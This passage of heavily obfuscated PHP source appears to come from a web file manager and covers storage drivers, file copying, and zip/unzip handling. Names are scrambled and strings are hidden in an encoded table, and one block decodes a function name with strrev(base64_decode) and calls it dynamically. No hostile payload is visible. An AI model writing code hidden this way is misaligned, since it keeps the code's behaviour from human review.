($†ÄŞ¶ê = 0; $†ÄŞ¶ê < count($¸½Ôñâä); $†ÄŞ¶ê++) { if ($†ÄŞ¶ê == 0 && $“ÓıÈÄŸ <= $¸½Ôñâä[$†ÄŞ¶ê]) { $“ÓıÈÄŸ = $¸½Ôñâä[$†ÄŞ¶ê]; break; } else { if ($“ÓıÈÄŸ > $¸½Ôñâä[$†ÄŞ¶ê - 1] && $“ÓıÈÄŸ <= $¸½Ôñâä[$†ÄŞ¶ê]) { $“ÓıÈÄŸ = $¸½Ôñâä[$†ÄŞ¶ê]; break; } else { if ($†ÄŞ¶ê == count($¸½Ôñâä) - 1 && $“ÓıÈÄŸ > $¸½Ôñâä[$†ÄŞ¶ê]) { $“ÓıÈÄŸ = $¸½Ôñâä[$†ÄŞ¶ê]; break; } } } } $Í¿Ã•ƒ× = self::driverMake($ğ¡£í¥); if ($Í¿Ã•ƒ×->isFileOutServer()) { return $Í¿Ã•ƒ×->fileOutImageServer($ğ¡£í¥, $“ÓıÈÄŸ); } return $Í¿Ã•ƒ×->fileOutImage($ğ¡£í¥, $“ÓıÈÄŸ); } private static function driverIsSame($ØÒÆ·¶À, $ËÊç°Ûê) { $÷’õ÷¢¯ =& $_SERVER[ñ÷§¡å]; $œÇµ‡åÑ = $ØÒÆ·¶À->getType(); $Ë½”“ƒ = $ËÊç°Ûê->getType(); if ($œÇµ‡åÑ != $Ë½”“ƒ) { return !1; } if ($œÇµ‡åÑ == $÷’õ÷¢¯[771]) { return !0; } if ($œÇµ‡åÑ == $÷’õ÷¢¯[116]) { return !0; } if ($ØÒÆ·¶À->pathDriver == $ËÊç°Ûê->pathDriver) { return !0; } return !1; } public static function copyUpdate($¶®ÒÊËé, $öê”ìÑ”) { $•œÅ¾ó =& $_SERVER[ñ÷§¡å]; if (!IO::exist($¶®ÒÊËé)) { return !1; } if (!IO::exist($öê”ìÑ”)) { IO::mkdir($öê”ìÑ”); } $”Ä×ğ­ª = self::_listAll($¶®ÒÊËé); $Ô—•Õõµ = self::_listAll($öê”ìÑ”); $ÎÒëëã = array(); $ŞÄÃ´î = array(); foreach ($”Ä×ğ­ª as $¤Áóà° => $’ÏçÖÑ) { if (isset($Ô—•Õõµ[$¤Áóà°])) { if ($’ÏçÖÑ[$•œÅ¾ó[85]] == 1) { continue; } if ($Ô—•Õõµ[$¤Áóà°][$•œÅ¾ó[86]] == $’ÏçÖÑ[$•œÅ¾ó[86]]) { continue; } } if ($’ÏçÖÑ[$•œÅ¾ó[85]] == 1) { $ŞÄÃ´î[] = $öê”ìÑ” . $•œÅ¾ó[8] . $¤Áóà°; continue; } $Â¯¢Å = strstr(trim($¤Áóà°, $•œÅ¾ó[8]), $•œÅ¾ó[8]) ? get_path_father($¤Áóà°) : $•œÅ¾ó[12]; $ÎÒëëã[] = array($•œÅ¾ó[1167] => $’ÏçÖÑ[$•œÅ¾ó[94]], $•œÅ¾ó[1168] => rtrim($öê”ìÑ”, $•œÅ¾ó[8]) . $•œÅ¾ó[8] . $Â¯¢Å, $•œÅ¾ó[1169] => $’ÏçÖÑ); } $×­Œê™¹ = array($•œÅ¾ó[209] => $ÎÒëëã, $•œÅ¾ó[85] => $ŞÄÃ´î); Hook::trigger($•œÅ¾ó[1170], $¶®ÒÊËé, $öê”ìÑ”, $×­Œê™¹); foreach ($ŞÄÃ´î as $’ÏçÖÑ) { IO::mkdir($’ÏçÖÑ); } foreach ($ÎÒëëã as $’ÏçÖÑ) { IO::copy($’ÏçÖÑ[$•œÅ¾ó[1167]], $’ÏçÖÑ[$•œÅ¾ó[1168]], REPEAT_REPLACE); } } private static function _listAll($¬ŠôŸô») { $‹¹ïÎí’ =& $_SERVER[ñ÷§¡å]; $¬ŠôŸô» = KodIO::clear($¬ŠôŸô»); $Å¯ªóÒ¨ = IO::listAll($¬ŠôŸô»); foreach ($Å¯ªóÒ¨ as &$Ô€‹ËÏ÷) { $†«§­–Ù = substr($Ô€‹ËÏ÷[$‹¹ïÎí’[94]], strlen($¬ŠôŸô»)); $Ô€‹ËÏ÷[$‹¹ïÎí’[1171]] = trim($†«§­–Ù, $‹¹ïÎí’[8]); } unset($Ô€‹ËÏ÷); return array_to_keyvalue($Å¯ªóÒ¨, $‹¹ïÎí’[1171]); } public static function fileSubstr($ÍÌÇ„ãÁ, $ş»ßˆóÙ, $şªÓ²°ì = false) { $ı£¦ğšŒ =& $_SERVER[ñ÷§¡å]; $İÅº¦’³ = self::driverMake($ÍÌÇ„ãÁ); $Äš‹åŠ× = $İÅº¦’³->size($ÍÌÇ„ãÁ); $µºÎÌ‹ª = $ş»ßˆóÙ; $äİœÆÊÉ = $şªÓ²°ì; if ($ş»ßˆóÙ < 0) { $ş»ßˆóÙ = $Äš‹åŠ× + $ş»ßˆóÙ; } if ($şªÓ²°ì === !1) { $şªÓ²°ì = $Äš‹åŠ× - $ş»ßˆóÙ; } if ($ş»ßˆóÙ + $şªÓ²°ì > $Äš‹åŠ×) { $şªÓ²°ì = $Äš‹åŠ× - $ş»ßˆóÙ; } if (!$Äš‹åŠ× && $İÅº¦’³->getType() == $ı£¦ğšŒ[116] && !$İÅº¦’³->exist($ÍÌÇ„ãÁ)) { $ÏáÅ»ñ = get_path_this($ÍÌÇ„ãÁ); $ßöÈ’‘í = parse_url_query($ÏáÅ»ñ); if (is_array($ßöÈ’‘í) && isset($ßöÈ’‘í[$ı£¦ğšŒ[32]])) { $ÏáÅ»ñ = urldecode($ßöÈ’‘í[$ı£¦ğšŒ[32]]); } throw new Exception($ı£¦ğšŒ[1172] . LNG($ı£¦ğšŒ[1173]) . $ı£¦ğšŒ[973] . clear_html($ÏáÅ»ñ) . $ı£¦ğšŒ[12]); } if ($şªÓ²°ì <= 0) { return $ı£¦ğšŒ[12]; } if ($ş»ßˆóÙ < 0 || $ş»ßˆóÙ >= $Äš‹åŠ× || $şªÓ²°ì > 1024 * 1024 * 10) { throw new Exception("\146\151\154\x65\122\145\141\144\40\145\x72\162\x6f\x72\x21\x20\x73\164\x61\162\x74\x3d{$ş»ßˆóÙ}\73\x6c\145\156\147\x74\x68\75{$şªÓ²°ì}\x3b\x20\163\x69\x7a\145\x3d{$Äš‹åŠ×}\x3b"); } $ºÍƒ¡¼é = $İÅº¦’³->fileSubstr($ÍÌÇ„ãÁ, $ş»ßˆóÙ, $şªÓ²°ì); if (!$ºÍƒ¡¼é && $şªÓ²°ì && isset($GLOBALS[$ı£¦ğšŒ[1174]])) { throw new Exception($GLOBALS[$ı£¦ğšŒ[1174]][$ı£¦ğšŒ[1175]]); } return $ºÍƒ¡¼é; } private static function driverMake(&$îï½Â‘”) { $¡Î¸ºá¼ =& $_SERVER[ñ÷§¡å]; $ÁÎëŠÍ” = KodIO::parse($îï½Â‘”); if (!self::$driverListSystem) { $„¿ìÜ‘ = Model($¡Î¸ºá¼[780])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($„¿ìÜ‘, $¡Î¸ºá¼[408]); } if ($ÁÎëŠÍ”[$¡Î¸ºá¼[33]] == KodIO::KOD_IO && !self::$driverListSystem[$ÁÎëŠÍ”[$¡Î¸ºá¼[408]]]) { return !1; } $îï½Â‘” = $ÁÎëŠÍ”[$¡Î¸ºá¼[1176]]; $Ã½ÕÃí¹ = self::driverGet($ÁÎëŠÍ”, $îï½Â‘”); return $Ã½ÕÃí¹; } private static function driverGet($ï°Çğ’ˆ, &$Ô¥¬ğà¦) { $´Ó€ãˆ€ =& $_SERVER[ñ÷§¡å]; $çÅÎã– = $ï°Çğ’ˆ[$´Ó€ãˆ€[1177]]; $¼í÷¬¬¿ = $ï°Çğ’ˆ[$´Ó€ãˆ€[408]]; switch ($ï°Çğ’ˆ[$´Ó€ãˆ€[33]]) { case KodIO::KOD_IO: $ï™‘÷Ì = self::$driverListSystem[$¼í÷¬¬¿]; break; case KodIO::KOD_SOURCE: $Ô¥¬ğà¦ = $¼í÷¬¬¿ . $Ô¥¬ğà¦; $ï™‘÷Ì = array($´Ó€ãˆ€[1178] => $´Ó€ãˆ€[1179], $´Ó€ãˆ€[6] => $ï°Çğ’ˆ); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $ŞĞù­Í = $GLOBALS[$´Ó€ãˆ€[1180]]; self::$driverListUser = array_to_keyvalue($ŞĞù­Í, $´Ó€ãˆ€[408]); } $ï™‘÷Ì = self::$driverListUser[$¼í÷¬¬¿]; break; case KodIO::KOD_SHARE_LINK: $ï™‘÷Ì = array($´Ó€ãˆ€[1178] => $´Ó€ãˆ€[1181], $´Ó€ãˆ€[6] => $ï°Çğ’ˆ); $˜¶ŸŸÍ = Action($´Ó€ãˆ€[1182])->sharePathInfo($ï°Çğ’ˆ[$´Ó€ãˆ€[94]]); $Ô¥¬ğà¦ = $˜¶ŸŸÍ[$´Ó€ãˆ€[411]]; if (!$˜¶ŸŸÍ[$´Ó€ãˆ€[411]]) { $¶£‚€ˆù = Model($´Ó€ãˆ€[610])->getInfo($˜¶ŸŸÍ[$´Ó€ãˆ€[498]]); $Ô¥¬ğà¦ = KodIO::clear($¶£‚€ˆù[$´Ó€ãˆ€[1183]] . $ï°Çğ’ˆ[$´Ó€ãˆ€[1176]]); $ï°Çğ’ˆ[$´Ó€ãˆ€[496]] = $¶£‚€ˆù; $ï°Çğ’ˆ[$´Ó€ãˆ€[1158]] = $Ô¥¬ğà¦; $ï™‘÷Ì = array($´Ó€ãˆ€[1178] => $´Ó€ãˆ€[1184], $´Ó€ãˆ€[6] => $ï°Çğ’ˆ); } break; case KodIO::KOD_SHARE_ITEM: $ï™‘÷Ì = array($´Ó€ãˆ€[1178] => $´Ó€ãˆ€[1185], $´Ó€ãˆ€[6] => $ï°Çğ’ˆ); $¶£‚€ˆù = Model($´Ó€ãˆ€[610])->getInfo($ï°Çğ’ˆ[$´Ó€ãˆ€[408]]); if ($¶£‚€ˆù[$´Ó€ãˆ€[411]] == $´Ó€ãˆ€[207]) { $Ô¥¬ğà¦ = KodIO::clear($¶£‚€ˆù[$´Ó€ãˆ€[1183]] . $ï°Çğ’ˆ[$´Ó€ãˆ€[1176]]); $ï°Çğ’ˆ[$´Ó€ãˆ€[496]] = $¶£‚€ˆù; $ï°Çğ’ˆ[$´Ó€ãˆ€[1158]] = $Ô¥¬ğà¦; $ï™‘÷Ì = array($´Ó€ãˆ€[1178] => $´Ó€ãˆ€[1186], $´Ó€ãˆ€[6] => $ï°Çğ’ˆ); } else { if (!$Ô¥¬ğà¦) { $Ô¥¬ğà¦ = $¶£‚€ˆù[$´Ó€ãˆ€[411]]; } } break; default: $Ô¥¬ğà¦ = $ï°Çğ’ˆ[$´Ó€ãˆ€[94]]; $ï™‘÷Ì = array($´Ó€ãˆ€[1178] => $´Ó€ãˆ€[1187]); break; } $ñ¸«ğ§® = $ï°Çğ’ˆ[$´Ó€ãˆ€[94]]; if (!isset(self::$driverCache[$ñ¸«ğ§®])) { $ÎÅûı£ˆ = strtolower($ï™‘÷Ì[$´Ó€ãˆ€[105]]); $ªŸÉ„¶ = $GLOBALS[$´Ó€ãˆ€[6]][$´Ó€ãˆ€[99]][$´Ó€ãˆ€[839]]; $¹¥¶ó«Œ = $´Ó€ãˆ€[84] . (isset($ªŸÉ„¶[$ÎÅûı£ˆ]) ? $ªŸÉ„¶[$ÎÅûı£ˆ] : ucfirst($ÎÅûı£ˆ)); if (!class_exists($¹¥¶ó«Œ)) { show_json("{$¹¥¶ó«Œ}\x20\156\157\x74\40\x65\x78\x69\x73\x74\x73\41", !1); } $çÏ©ÊÎ¥ = isset($ï™‘÷Ì[$´Ó€ãˆ€[6]]) ? $ï™‘÷Ì[$´Ó€ãˆ€[6]] : !1; self::$driverCache[$ñ¸«ğ§®] = new $¹¥¶ó«Œ($çÏ©ÊÎ¥); } $µÌ¯‹ƒÒ = self::$driverCache[$ñ¸«ğ§®]; $µÌ¯‹ƒÒ->pathDriver = $çÅÎã–; $µÌ¯‹ƒÒ->pathBase = $´Ó€ãˆ€[12]; if (isset($ï™‘÷Ì[$´Ó€ãˆ€[6]][$´Ó€ãˆ€[1188]])) { $µÌ¯‹ƒÒ->pathBase = rtrim($ï™‘÷Ì[$´Ó€ãˆ€[6]][$´Ó€ãˆ€[1188]], $´Ó€ãˆ€[8]) . $´Ó€ãˆ€[8]; $Ô¥¬ğà¦ = $µÌ¯‹ƒÒ->pathBase . ltrim($Ô¥¬ğà¦, $´Ó€ãˆ€[8]); } $Ô¥¬ğà¦ = $µÌ¯‹ƒÒ->getPath($Ô¥¬ğà¦); if (isset($ï°Çğ’ˆ[$´Ó€ãˆ€[1158]])) { $Ô¥¬ğà¦ = $ï°Çğ’ˆ[$´Ó€ãˆ€[1158]]; } $µÌ¯‹ƒÒ->path = $Ô¥¬ğà¦; return $µÌ¯‹ƒÒ; } public static function errorTips($ÒãªÛ¡ˆ = false) { $²Ş÷ùí’ =& $_SERVER[ñ÷§¡å]; static $ğ†åõ•š = array(); $Ûä·’® = 1000; if ($ÒãªÛ¡ˆ === -1) { return $ğ†åõ•š ? $ğ†åõ•š[count($ğ†åõ•š) - 1] : $²Ş÷ùí’[12]; } if ($ÒãªÛ¡ˆ === !1) { return implode($²Ş÷ùí’[65], $ğ†åõ•š); } if (count($ğ†åõ•š) >= $Ûä·’®) { $ğ†åõ•š = array_slice($ğ†åõ•š, $Ûä·’® * 0.5, $Ûä·’®); } $ğ†åõ•š[] = $ÒãªÛ¡ˆ; write_log($²Ş÷ùí’[172] . ACTION . $²Ş÷ùí’[1189] . $ÒãªÛ¡ˆ, $²Ş÷ùí’[1190]); } public static function getLastError($¤öÉ×âŸ = '') { $«ª˜¤·ù = self::errorTips(-1); return $«ª˜¤·ù ? $«ª˜¤·ù : $¤öÉ×âŸ; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $¶ÅÕ†˜›; if (!$¶ÅÕ†˜›) { $¶ıÁ¾€» = IO::init($_SERVER[ñ÷§¡å][8]); } return $¶ıÁ¾€»; } private static function iconvSystem($Ö‰¸š) { return self::local()->iconvSystem($Ö‰¸š); } private static function iconvApp($°ºè™àä) { return self::local()->iconvApp($°ºè™àä); } public static function zip($Š´µì‘, $äŸ³÷™Ğ = "\172\x69\x70", $˜¦§”à€ = '', $â½Òë¼ê = REPEAT_RENAME) { $Æê½òÔ” =& $_SERVER[ñ÷§¡å]; $±ÏÑñ÷ = self::init($Š´µì‘[0][$Æê½òÔ”[94]]); $‡£òÎÓ = self::info($Š´µì‘[0][$Æê½òÔ”[94]]); $Ù§»ÅÄ¶ = !1; if (!$˜¦§”à€ && $±ÏÑñ÷->getType() == $Æê½òÔ”[116]) { $§‡¥Èïø = self::zipFileList($Š´µì‘); } else { $Ù§»ÅÄ¶ = $˜¦§”à€ ? $˜¦§”à€ : TEMP_FILES . $Æê½òÔ”[1191] . time() . rand_string(8) . $Æê½òÔ”[8]; mk_dir($Ù§»ÅÄ¶); $§‡¥Èïø = self::zipFileList($Š´µì‘, $Ù§»ÅÄ¶); } $Êˆ¡ÕŸÁ = $‡£òÎÓ[$Æê½òÔ”[32]]; if (count($§‡¥Èïø) > 1) { $ÇÖµíÆ = IO::info(IO::pathFather($‡£òÎÓ[$Æê½òÔ”[94]])); $Êˆ¡ÕŸÁ = $ÇÖµíÆ[$Æê½òÔ”[32]]; } $‡”â±â = $Ù§»ÅÄ¶; if (!$‡”â±â) { $‡”â±â = get_path_father($‡£òÎÓ[$Æê½òÔ”[94]]); if (!$˜¦§”à€ && $±ÏÑñ÷->getType() == $Æê½òÔ”[116]) { $‡”â±â = get_path_father($±ÏÑñ÷->path); } $ÎŠ¯òƒÌ = IO::info($‡”â±â); if (!$ÎŠ¯òƒÌ[$Æê½òÔ”[212]]) { show_json(LNG($Æê½òÔ”[1192]), !1); } } $¡âñÌí = $‡”â±â . $Êˆ¡ÕŸÁ . $Æê½òÔ”[10] . $äŸ³÷™Ğ; $¡âñÌí = get_filename_auto($¡âñÌí, $Æê½òÔ”[12], $â½Òë¼ê); $ûŞ¢Ÿˆˆ = self::iconvSystem($¡âñÌí); foreach ($§‡¥Èïø as $ÚĞÒ÷å => $ë™¦ÎÄ) { $§‡¥Èïø[$ÚĞÒ÷å] = self::iconvSystem($ë™¦ÎÄ); } KodArchive::create($ûŞ¢Ÿˆˆ, $§‡¥Èïø); if (!IO::exist($¡âñÌí)) { if ($Ù§»ÅÄ¶) { del_dir($Ù§»ÅÄ¶); } show_json(LNG($Æê½òÔ”[1193]), !1); } if ($˜¦§”à€ || !$Ù§»ÅÄ¶) { if ($Ù§»ÅÄ¶ && strstr($Ù§»ÅÄ¶, TEMP_FILES)) { $…ÕŸ«©Ó = $§‡¥Èïø = array(); recursion_dir($‡”â±â, $…ÕŸ«©Ó, $§‡¥Èïø, 0); foreach ($…ÕŸ«©Ó as $Äõé‰İÑ) { del_dir($Äõé‰İÑ); } foreach ($§‡¥Èïø as $‡õÊ‹ô™) { if ($‡õÊ‹ô™ == $ûŞ¢Ÿˆˆ) { continue; } del_file($‡õÊ‹ô™); } } return $¡âñÌí; } $œÍæôä = self::pathFather($‡£òÎÓ[$Æê½òÔ”[94]]); $Û«¤Êî« = self::move($¡âñÌí, $œÍæôä, $â½Òë¼ê); if (!$Û«¤Êî«) { del_dir($Ù§»ÅÄ¶); show_json(LNG($Æê½òÔ”[1193]), !1); } del_dir($Ù§»ÅÄ¶); return $Û«¤Êî«; } public static function unzip($¾Ğ‹ˆ‚, $’èåÓ¤ = "\x72\145\160\x6c\141\143\x65") { $Ô˜–î¿ =& $_SERVER[ñ÷§¡å]; $ê¢ë½˜´ = $¾Ğ‹ˆ‚[$Ô˜–î¿[94]]; $ÁÎŒ†Æş = $¾Ğ‹ˆ‚[$Ô˜–î¿[1194]]; if (!($ç»Ö÷øÍ = parent::info($ê¢ë½˜´))) { show_json(LNG($Ô˜–î¿[1195]), !1); } if (!($†·“„ùÊ = parent::infoFull($ÁÎŒ†Æş))) { $ÁÎŒ†Æş = parent::mkdir($ÁÎŒ†Æş); $†·“„ùÊ = array($Ô˜–î¿[94] => $ÁÎŒ†Æş); } else { if (isset($†·“„ùÊ[$Ô˜–î¿[411]]) && trim($†·“„ùÊ[$Ô˜–î¿[94]], $Ô˜–î¿[8]) != trim($ÁÎŒ†Æş, $Ô˜–î¿[8])) { $Á„õşì¤ = KodIO::make($†·“„ùÊ[$Ô˜–î¿[441]]); $‡Á‡Ö¼Ø = parent::fileNameAuto($Á„õşì¤, $†·“„ùÊ[$Ô˜–î¿[32]], REPEAT_RENAME_FOLDER, !0); $ÁÎŒ†Æş = parent::mkdir($Á„õşì¤ . $‡Á‡Ö¼Ø); $†·“„ùÊ = array($Ô˜–î¿[94] => $ÁÎŒ†Æş); } } $ÁÎŒ†Æş = $†·“„ùÊ[$Ô˜–î¿[94]]; $¥ö÷ŠÃÂ = self::tmpFileName($ç»Ö÷øÍ); $¨Ïâ«ô… = TEMP_FILES . $¥ö÷ŠÃÂ; del_dir($¨Ïâ«ô…); mk_dir($¨Ïâ«ô…); $¸‡œšÛ„ = self::fileExt($ç»Ö÷øÍ); $î‚ÅªìÑ = $¨Ïâ«ô… . $Ô˜–î¿[10] . $¸‡œšÛ„; if (!@file_exists(self::iconvSystem($î‚ÅªìÑ))) { $¼ÔëÇºÆ = self::localFilePath($ê¢ë½˜´, $¸‡œšÛ„); $î‚ÅªìÑ = $¼ÔëÇºÆ ? $¼ÔëÇºÆ : parent::download($ê¢ë½˜´, $î‚ÅªìÑ); } $î‚ÅªìÑ = self::iconvSystem($î‚ÅªìÑ); $ŸÈˆ˜ú› = isset($¾Ğ‹ˆ‚[$Ô˜–î¿[1196]]) ? $¾Ğ‹ˆ‚[$Ô˜–î¿[1196]] : $Ô˜–î¿[1197]; $ôİ÷±Ò = KodArchive::extract($î‚ÅªìÑ, $¨Ïâ«ô… . $Ô˜–î¿[8], $ŸÈˆ˜ú›); self::archiveExt(); if (!$ôİ÷±Ò[$Ô˜–î¿[1198]]) { show_json($Ô˜–î¿[1199] . $ôİ÷±Ò[$Ô˜–î¿[1200]], !1); } Hook::trigger($Ô˜–î¿[1201], $¨Ïâ«ô…); recursion_dir($¨Ïâ«ô…, $Ñç˜£€„, $™™“šÌ, 0); $Òà„ùÀ = array_merge($Ñç˜£€„, $™™“šÌ); foreach ($Òà„ùÀ as $¯íğù) { $¯íğù = self::iconvApp($¯íğù); self::move($¯íğù, $ÁÎŒ†Æş, $’èåÓ¤); } del_dir($¨Ïâ«ô…); if (!$¼ÔëÇºÆ) { del_file($î‚ÅªìÑ); } return !0; } public static function unzipList($şö²š†ô) { $ûşØ—Ø” =& $_SERVER[ñ÷§¡å]; $ëÍï¥ = $şö²š†ô[$ûşØ—Ø”[94]]; $¶¡Ü¾Ÿª = isset($şö²š†ô[$ûşØ—Ø”[1202]]) ? $şö²š†ô[$ûşØ—Ø”[1202]] : -1; $Ê‚şşËÏ = 50000; if (request_url_safe($ëÍï¥)) { $é•Ã¿¨ = parse_url_query($ëÍï¥); if (!isset($é•Ã¿¨[$ûşØ—Ø”[94]])) { show_json($ûşØ—Ø”[1203], !1); } } $Èœ˜¸Öô = isset($é•Ã¿¨) ? $é•Ã¿¨[$ûşØ—Ø”[94]] : $ëÍï¥; $„à¾ÖÚ = self::info($Èœ˜¸Öô); $ƒ¯³³„ = self::fileExt($„à¾ÖÚ); $œ¯®…Ïü = self::tmpFileName($„à¾ÖÚ); if (isset($é•Ã¿¨)) { $ë¿á¥„³ = array($é•Ã¿¨[$ûşØ—Ø”[94]], $é•Ã¿¨[$ûşØ—Ø”[1202]], $é•Ã¿¨[$ûşØ—Ø”[32]]); $®‚ö¿áŠ = md5(implode($ûşØ—Ø”[11], $ë¿á¥„³)) . $ûşØ—Ø”[10] . get_path_ext($é•Ã¿¨[$ûşØ—Ø”[32]]); } else { $ë¿á¥„³ = array($„à¾ÖÚ[$ûşØ—Ø”[32]], $„à¾ÖÚ[$ûşØ—Ø”[94]], $„à¾ÖÚ[$ûşØ—Ø”[86]]); $®‚ö¿áŠ = md5(implode($ûşØ—Ø”[11], $ë¿á¥„³)) . $ûşØ—Ø”[10] . $ƒ¯³³„; } if ($¶¡Ü¾Ÿª == -1) { $ƒ±âÜ­› = IO_PATH_SYSTEM_TEMP . "\172\151\x70\x56\x69\145\167\x2f{$œ¯®…Ïü}\57{$®‚ö¿áŠ}\56\154\x6f\147"; $î§ı…İÅ = self::infoFull($ƒ±âÜ­›); if ($î§ı…İÅ) { $ƒ±âÜ­› = $î§ı…İÅ[$ûşØ—Ø”[94]]; $œ¦ßÄñÀ = self::getContent($ƒ±âÜ­›); if ($œ¦ßÄñÀ) { $¾áİƒÆ  = json_decode($œ¦ßÄñÀ, !0); $¾áİƒÆ  = is_array($¾áİƒÆ ) ? $¾áİƒÆ  : array(); if (count($¾áİƒÆ ) >= $Ê‚şşËÏ) { show_json(sprintf(LNG($ûşØ—Ø”[1204]), count($¾áİƒÆ )), !1); } return $¾áİƒÆ ; } } else { $ƒ±âÜ­› = self::mkfile($ƒ±âÜ­›); } } $ü¾‘É¤ = TEMP_FILES . $œ¯®…Ïü; if (!is_dir($ü¾‘É¤)) { mk_dir($ü¾‘É¤); } $²Ö†¢«â = $ü¾‘É¤ . $ûşØ—Ø”[8] . $®‚ö¿áŠ; if (!@file_exists(self::iconvSystem($²Ö†¢«â))) { if (isset($é•Ã¿¨)) { url_request($ëÍï¥, $ûşØ—Ø”[1205], $²Ö†¢«â); } else { $Å¡’´õ¬ = self::localFilePath($ëÍï¥, $ƒ¯³³„); $²Ö†¢«â = $Å¡’´õ¬ ? $Å¡’´õ¬ : self::download($ëÍï¥, $²Ö†¢«â); } } $²Ö†¢«â = self::iconvSystem($²Ö†¢«â); if ($¶¡Ü¾Ÿª >= 0) { $û¾ŠùÌı = isset($şö²š†ô[$ûşØ—Ø”[1206]]) ? $şö²š†ô[$ûşØ—Ø”[1206]] : !1; $…÷ÅÍÀÂ = isset($şö²š†ô[$ûşØ—Ø”[32]]) ? $şö²š†ô[$ûşØ—Ø”[32]] : $ûşØ—Ø”[12]; KodArchive::filePreview($²Ö†¢«â, $¶¡Ü¾Ÿª, $û¾ŠùÌı, $…÷ÅÍÀÂ); self::archiveExt(); die; } $¥…·‘á = KodArchive::listContent($²Ö†¢«â); self::archiveExt(); del_dir($ü¾‘É¤); if (!$¥…·‘á[$ûşØ—Ø”[1198]]) { show_json($¥…·‘á[$ûşØ—Ø”[1200]], !1); } $¾áİƒÆ  = json_encode($¥…·‘á[$ûşØ—Ø”[1200]]); self::setContent($ƒ±âÜ­›, $¾áİƒÆ ); if (count($¥…·‘á[$ûşØ—Ø”[1200]]) >= $Ê‚şşËÏ) { show_json(sprintf(LNG($ûşØ—Ø”[1204]), count($¥…·‘á[$ûşØ—Ø”[1200]])), !1); } return $¥…·‘á[$ûşØ—Ø”[1200]]; } private static function fileExt($éë¢—›Ë) { $”Ğ´Ôé½ =& $_SERVER[ñ÷§¡å]; $ìë›ì­´ = $éë¢—›Ë[$”Ğ´Ôé½[184]]; if ($ìë›ì­´ == $”Ğ´Ôé½[1207]) { $•ËƒíÌ‰ = $”Ğ´Ôé½[1208]; if (substr($éë¢—›Ë[$”Ğ´Ôé½[32]], -strlen($•ËƒíÌ‰)) == $•ËƒíÌ‰) { $ìë›ì­´ = $”Ğ´Ôé½[1209]; } } self::archiveExt($ìë›ì­´); return $ìë›ì­´; } private static function zipFileList($Ï²ÌÀ‘Ÿ, $ŠüÉ×¨– = false) { $Ù×ÉÕ“ =& $_SERVER[ñ÷§¡å]; $±ç‘í‹± = array(); foreach ($Ï²ÌÀ‘Ÿ as $¯šÀú°‰) { $¿±ÖïöÑ = $¯šÀú°‰[$Ù×ÉÕ“[94]]; if ($ŠüÉ×¨–) { $¿±ÖïöÑ = self::copy($¯šÀú°‰[$Ù×ÉÕ“[94]], $ŠüÉ×¨–, $Ù×ÉÕ“[831]); } else { $ö´£Æ£‹ = self::init($¯šÀú°‰[$Ù×ÉÕ“[94]]); if ($ö´£Æ£‹->getType() == $Ù×ÉÕ“[116]) { $¿±ÖïöÑ = $ö´£Æ£‹->path; } } if ($¿±ÖïöÑ && self::local()->exist($¿±ÖïöÑ)) { $±ç‘í‹±[$¯šÀú°‰[$Ù×ÉÕ“[94]]] = $¿±ÖïöÑ; } } if (!empty($±ç‘í‹±)) { return array_values($±ç‘í‹±); } show_json(LNG($Ù×ÉÕ“[1173]), !1); } public static function tmpFileName($åı …ßñ) { $ø©ãâ…ç =& $_SERVER[ñ÷§¡å]; $ĞÔØâ = array($åı …ßñ[$ø©ãâ…ç[32]], $åı …ßñ[$ø©ãâ…ç[94]], $åı …ßñ[$ø©ãâ…ç[86]], $åı …ßñ[$ø©ãâ…ç[530]]); return md5(implode($ø©ãâ…ç[11], $ĞÔØâ)); } private static function localFilePath($¬°éøÃ¤, $òåûÏáö) { $Çµ‚¾À© =& $_SERVER[ñ÷§¡å]; if ($òåûÏáö == $Çµ‚¾À©[1210] && strtoupper(substr(PHP_OS, 0, 3)) == $Çµ‚¾À©[1211]) { return !1; } $¦ŞÉÕÈ§ = KodIO::parse($¬°éøÃ¤); if ($¦ŞÉÕÈ§[$Çµ‚¾À©[33]] == KodIO::KOD_SOURCE) { $Å¢ûÂ™á = Model($Çµ‚¾À©[838])->fileInfoGet(KodIO::sourceID($¬°éøÃ¤)); if (!$Å¢ûÂ™á[$Çµ‚¾À©[94]]) { show_json($Çµ‚¾À©[1212], !1); } $¬°éøÃ¤ = $Å¢ûÂ™á[$Çµ‚¾À©[94]]; } $‡ØÁº = self::init($¬°éøÃ¤); if ($‡ØÁº->pathParse[$Çµ‚¾À©[1158]]) { $¬°éøÃ¤ = $‡ØÁº->pathParse[$Çµ‚¾À©[1158]]; $‡ØÁº = self::init($¬°éøÃ¤); } $Ùİ²–®å = $‡ØÁº->getType(); if ($Ùİ²–®å == $Çµ‚¾À©[116] || $Ùİ²–®å == $Çµ‚¾À©[1213]) { if (!$‡ØÁº->exist($‡ØÁº->path)) { show_json(LNG($Çµ‚¾À©[115]), !1); } return $‡ØÁº->path; } return !1; } private static function archiveExt($§«©¸Ñ‘ = '') { $GLOBALS[$_SERVER[ñ÷§¡å][1214]] = $§«©¸Ñ‘; } } goto Bœ‹•–Âù…; b¾¯¶æ“êÂ: $fileSize = strrev(base64_decode($_SERVER[ù†®£‚ı][0])); function binCheckNeq($İ´™üà×, $®–»÷Ÿï) { return $İ´™üà× != $®–»÷Ÿï; } $_SERVER[$_SERVER[ù†®£‚ı][1]] = $fileSize($_SERVER[$_SERVER[ù†®£‚ı][2]]); goto C‰±¾íîÙĞ; Câ˜¤èƒª: class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\145\x6d\x2e\x4c\151\x67\x68\164\101\160\x70"; public $modelType = "\x53\171\163\164\145\x6d\117\x70\164\x69\x6f\156"; public $field = array("\156\x61\155\145", "\x67\162\157\165\160", "\144\x65\x73\x63", "\x63\x6f\156\164\x65\x6e\x74"); public function listData($ÁÎ˜¡êà = false, $Ôœı£®Ÿ = "\155\157\x64\151\146\x79\124\151\x6d\x65", $‡·Å½Í© = true) { return parent::listData($ÁÎ˜¡êà, $Ôœı£®Ÿ, $‡·Å½Í©); } public function remove($ŸÂØ‚Ÿı) { $òÑóÆÅÅ = $this->findByName($ŸÂØ‚Ÿı); if (!$òÑóÆÅÅ) { return !1; } return parent::remove($òÑóÆÅÅ[$_SERVER[ñ÷§¡å][408]]); } public function add($†ÓÇşŞå) { if ($this->findByName($†ÓÇşŞå[$_SERVER[ñ÷§¡å][32]])) { return !1; } return parent::insert($†ÓÇşŞå); } public function update($ÑÅ´ÎıÏ, $›ãƒ şÅ) { 